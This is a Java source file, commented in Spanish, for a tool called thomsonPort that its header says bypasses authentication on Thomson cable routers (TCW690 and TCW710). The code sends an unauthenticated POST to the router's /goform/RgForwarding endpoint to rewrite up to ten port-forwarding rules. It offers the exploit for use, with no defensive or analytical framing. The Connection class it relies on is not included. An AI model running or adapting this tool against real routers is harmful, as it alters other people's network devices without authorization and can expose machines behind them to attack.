
import java.util.ArrayList;

/*
 * Aplicación para bypassear la autenticación de routers Thomson.
 *
 * Con la aplicacion se puede modificar la tabla de forwading de los routers
 * Thomson (probado en los modelos TCW690 y TCW710). Basado en la aplicacion
 * bypassThomson 0.1 de Luis Delgado J.
 *
 * @author Kamisama666
 * @version thomsonPort 0.1
 */
public class Main {
    /*
    Uso: thomsonPort -h <host> -p ipuerto:dirlocal:PuertoInicio:PuertoDestino:estado -p ...
    */
    private static String host;
    public static String[] dirLocal=new String[10];
    private static String[] puertoInicio=new String[10];
    private static String[] puertoDestino=new String[10];
    private static String[] estado=new String[10];
    private static Connection conn = new Connection();

    public static void main(String[] args) {
        if (args.length!=22) terminate("Tienes que dar los paramentros exactos!");
        getParams(args);
        String url = "http://" + host + "/goform/RgForwarding";
        String param = createMessage();
        conn.postMethod(url,param);
       
    }

    /*
     * Metodo utilizado para obtener los parametros de la aplicacion.
     *
     * @param args String[] que contiene los parametros introducidos por el
     *             usuario.
     */
    private static void getParams(String[] args) {
        for (int i=0; i<args.length; i++) {
            if (args[i].equals("-h") && i<args.length-1) {
                host = args[i+1];
            } else if (args[i].equals("-p") && i<args.length-1) {
              processParam(args[i+1]);
            }
        }
    }
        
        
     /*
      * Metodo utilizado para asignar las variables de puertos
      * 
      * @param String argo argumento ofuscado
      * thomsonPort -h <router_ip> -p idport:localip:InitPort:DestinyPort:state -p ...
	  *	1:10:1200:1200:a
      */
       
     private static void processParam(String argo) {
    	 String[] argumentos=new String[5];
    	 int pos;
    	 argumentos=argo.split(":");
    	 pos=Integer.parseInt(argumentos[0])-1;
    	 dirLocal[pos]=argumentos[1];
    	 puertoInicio[pos]=argumentos[2];
    	 puertoDestino[pos]=argumentos[3];
    	 estado[pos]=argumentos[4];     
     }
     
     /*
      * Metodo que devuelve la cadena con el mensaje a enviar al router
      */
     
     private static String createMessage() {
    	 String mensaje="";
    	 String id;
    	
    	 for (int i=0;i<10;i++) {
    		 id=Integer.toString(i+1);
    		 
    		 mensaje=mensaje+"PortForwardAddressLocal"+id+"IP3="+dirLocal[i]+"&";
    		 mensaje=mensaje+"PortForwardPortGlobalStart"+id+"="+ puertoInicio[i]+"&";
    		 mensaje=mensaje+"PortForwardPortGlobalEnd"+id+"="+puertoDestino[i]+"&";
    		 mensaje=mensaje+"PortForwardProtocol"+id+"=254&";
    		 if (estado[i].equals("a")) {
    			 mensaje=mensaje+"PortForwardEnable"+id+"=0x01&";
    		 }
    		 
    	 }
    	 mensaje=mensaje.substring(0,mensaje.length()-1);
    	 return mensaje;
     }

    /*
     * Metodo utilizado para detener la ejecucion de la aplicacion mostrando un
     * mensaje de alerta.
     *
     * @param msg Mensaje de alerta a mostrar.
     */
    private static void terminate(String msg) {
        System.err.println("Error: " + msg);
        System.exit(0);
    }

}
